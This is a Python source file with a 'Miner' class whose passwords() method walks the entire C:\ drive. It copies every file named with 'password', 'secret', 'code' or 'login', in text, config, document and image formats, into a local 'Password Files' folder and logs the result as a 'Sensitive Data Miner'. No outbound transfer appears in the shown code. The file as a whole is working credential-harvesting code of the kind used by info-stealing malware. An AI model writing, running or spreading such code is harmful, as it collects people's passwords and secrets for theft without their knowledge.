import os
from pathlib import Path
import shutil
from CODE.Custom_Libraries.Log import Log


class Miner:
    @staticmethod
    def __search_and_copy_files(keyword):
        drives_root = Path('C:\\')
        destination = Path('Password Files')

        # List of allowed extensions
        allowed_extensions = ['.png', '.txt', '.md', '.json', '.yaml', '.secret', '.jpg', '.jpeg', '.password', '.text', '.docx', '.doc']

        for root, dirs, files in os.walk(drives_root):
            try:
                root = Path(root)
                for filename in files:
                    try:
                        if keyword.lower() in filename.lower() and Path(filename).suffix in allowed_extensions:
                            src_file_path = root / filename
                            dst_file_path = destination / filename

                            shutil.copy(src_file_path, dst_file_path)
                            Log().info(f"Copied {src_file_path} to {dst_file_path}")
                    except Exception as e:
                        Log().error(f"Failed to copy file: {e}")
            except Exception as e:
                Log().error(f"Failed to copy file: {e}")


    def passwords(self):
        # Keywords to search for in filenames
        keywords = ['password', 'secret', 'code', 'login']
        if os.path.exists('Password Files'):
            shutil.rmtree('Password Files')
        os.makedirs('Password Files')
        for word in keywords:
            self.__search_and_copy_files(word)
        Log().info('Sensitive Data Miner Completed')
